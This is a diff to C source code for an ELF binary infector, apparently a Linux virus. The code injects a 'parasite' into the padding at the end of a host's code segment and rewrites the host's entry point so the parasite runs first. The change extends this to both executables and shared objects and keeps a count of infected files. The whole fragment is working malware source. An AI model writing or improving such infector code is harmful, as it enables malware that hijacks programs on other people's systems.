@@ -65,7 +65,8 @@
 //  CRITICAL GLOBAL VARIABLES 
 
 
-Elf64_Off		parasite_offset;				// Parasite host residence
+Elf64_Addr		parasite_load_address;			// parasite entry point (if parasite is LSB EXEC)
+Elf64_Off		parasite_offset;				// Parasite entry point (if parasite is .so)
 uint64_t		parasite_size;					
 int8_t			*parasite_code;					// Parasite residence (in memory before meeting its host )
 
@@ -73,7 +74,10 @@ Elf64_Addr		original_entry_point;			// Host entry point
 Elf64_Off		code_segment_end_offset;		// Location to inject parasite
 uint64_t   		host_file_size;					// Host binary size (on disk)
 
-unsigned int	infected_count = 0;				// An extern variable used in main()
+unsigned int	infected_count 			= 0;	// An extern variable used in main()
+
+int				HOST_IS_EXECUTABLE 		= 0;	// Host is LSB Executable
+int 			HOST_IS_SHARED_OBJECT 	= 0;	// Host is a Shared Object
 
 
 void ElfParser(char *filepath)
@@ -84,10 +88,13 @@ void ElfParser(char *filepath)
 
 
 	// SKIP Relocatable, files and 32-bit class of binaries
-	Elf64_Ehdr *binary_header = (Elf64_Ehdr *) host_mapping;
-    if ( binary_header->e_type == ET_REL ||
-         binary_header->e_type == ET_CORE ) {printf(CYAN"hahaha\n"RESET); return;}
-    if ( binary_header->e_ident[EI_CLASS] == ELFCLASS32 ) {printf(CYAN"YAAAA\n"RESET);return;}
+	Elf64_Ehdr *host_header = (Elf64_Ehdr *) host_mapping;
+    if ( host_header->e_type == ET_REL ||
+         host_header->e_type == ET_CORE ) return;
+	else if ( host_header->e_type == ET_EXEC )	HOST_IS_EXECUTABLE = 1;
+	else if ( host_header->e_type == ET_DYN  )	HOST_IS_SHARED_OBJECT = 1;
+
+    if ( host_header->e_ident[EI_CLASS] == ELFCLASS32 ) return;
 
 	
 	// Load Parasite into memory (from disk), uses extern 'parasite_path' defined in main.c implicitly
@@ -105,9 +112,11 @@ void ElfParser(char *filepath)
 	
 
 	// Save original_entry_point of host and patch host entry point with parasite_offset
-	Elf64_Ehdr *host_elf_header = (Elf64_Ehdr *) host_mapping;
-	original_entry_point 		= host_elf_header->e_entry; 
-	host_elf_header->e_entry 	= parasite_offset;
+	original_entry_point 		= host_header->e_entry; 
+	if (HOST_IS_EXECUTABLE)
+		host_header->e_entry 	= parasite_load_address;
+	else if (HOST_IS_SHARED_OBJECT)
+		host_header->e_entry 	= parasite_offset;
 
 
 	// Patch SHT
@@ -263,6 +272,7 @@ Elf64_Off GetPaddingSize(void *host_mapping)
 			// Calculate the offset where the code segment ends to bellow calculate padding_size 
 			code_segment_end_offset	= phdr_entry->p_offset + phdr_entry->p_filesz;
 			parasite_offset			= code_segment_end_offset;
+			parasite_load_address	= phdr_entry->p_vaddr  + phdr_entry->p_filesz;
 
 
 			// Increase its p_filesz and p_memsz by parasite_size (to accomodate parasite)
